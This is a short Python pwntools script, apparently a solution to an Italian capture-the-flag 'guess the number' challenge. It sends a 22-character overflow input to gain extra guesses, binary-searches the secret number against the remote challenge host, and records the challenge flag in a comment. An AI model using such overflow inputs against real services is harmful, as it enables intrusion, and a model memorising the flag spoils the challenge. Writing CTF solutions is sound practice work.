#! /usr/bin/env python3


from pwn import *

conn = remote('gtn.challs.olicyber.it',10022)

conn.recvuntil('high scores:\n')

# questo `e overflow importante
conn.sendline('a'*22) #da 20 va in overflow, mi permette di fare molti guess in pi`u

conn.recvuntil('to guess it!\n')
upper = 10000000000
lower = -10000000000

# binary search per trovare il numero giusto
while True:
	valoreMedio = (upper + lower)//2
	conn.sendline(str(valoreMedio))

	# conn.interactive()
	res = conn.recvline()
	if lower > upper:
		print(" strano bug, fuck ")
		break
	# ce un piccolo bug nel caso in cui upper - lower = 1 ma spero che non accada spesso
	if res == b'Try lower ;)\n':
		upper = valoreMedio
	elif res == b'Try higher ;)\n':
		lower = valoreMedio
	else:
		print(res, "trovato?")
		conn.interactive()
		break
# flag{4lw4y5_r34d_w4rn1ng5_>:[}

# print(res)

